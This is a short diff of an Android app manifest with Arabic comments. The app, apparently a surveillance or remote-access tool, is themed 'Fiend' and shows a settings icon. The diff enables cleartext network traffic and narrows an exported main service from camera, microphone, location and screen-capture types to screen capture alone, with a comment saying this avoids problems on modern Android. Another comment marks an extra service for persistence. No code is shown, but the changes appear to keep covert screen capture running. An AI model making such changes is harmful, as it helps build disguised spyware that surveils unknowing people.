@@ -1,4 +1,3 @@
-<!-- AndroidManifest.xml (معدل) -->
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
@@ -40,6 +39,7 @@
         android:roundIcon="@drawable/settings"
         android:supportsRtl="true"
         android:theme="@style/Theme.Fiend"
+        android:usesCleartextTraffic="true"
         tools:targetApi="31">
         
         <activity
@@ -84,12 +84,12 @@
             </intent-filter>
         </service>
         
-        <!-- الخدمة الرئيسية (خدمة المقدمة) -->
+        <!-- الخدمة الرئيسية (تم تبسيط النوع لتجنب مشاكل أندرويد الحديث) -->
         <service
             android:name=".MainService"
             android:enabled="true"
             android:exported="true"
-            android:foregroundServiceType="camera|microphone|location|mediaProjection" />
+            android:foregroundServiceType="mediaProjection" />
             
         <!-- خدمة إضافية للثبات -->
         <service
